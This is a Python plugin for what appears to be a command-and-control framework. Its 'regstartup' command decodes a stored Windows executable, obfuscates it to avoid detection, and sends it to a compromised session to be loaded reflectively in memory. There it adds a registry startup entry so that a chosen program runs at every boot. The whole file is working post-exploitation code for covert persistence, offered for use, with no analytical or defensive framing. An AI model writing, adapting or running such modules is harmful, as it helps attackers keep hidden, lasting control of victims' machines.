import os
import base64
import hashlib

from Public.Obfuscator import Obfuscator

name = 'regstartup'
_type = 'exeLite'
help = 'regstartup "name" "path"\nReflectively load the RegStartup.exe into memory.'

def Run(paras, t):
    if paras == '-h':
        t.AddContent(help, '')
        t.AddContent('[!] High-Risk Behavior: Modify Registry.')
    else:
        paras = t.GetMultiParas(paras)
        if len(paras) == 2:
            name = paras[0]
            path = os.path.normpath(paras[1])
            if t.sessionInfo['os'] == 'windows' and t.sessionInfo['arch'] == 'x64':
                with open(f'{os.path.dirname(os.path.abspath(__file__))}\\RegStartup\\x64\\Release\\RegStartup_Base64.txt', 'r', encoding='UTF-8') as f:
                    exe = bytearray(base64.b64decode(f.read().encode()))
                hash = hashlib.md5(exe).hexdigest()
                if hash in t.sessionInfo['hashInfo']:
                    exe = b''
                elif not Obfuscator.OBFEXE(exe):
                    return
                t.AddCommand({'type': _type, 'hash': hash, 'bin': exe, 'func': 'RegStartup', 'paras': f'{name}\x00{path}\x00', 'async': 'false'})
        else:
            t.AddContent(help, '')
            t.AddContent('[!] High-Risk Behavior: Modify Registry.')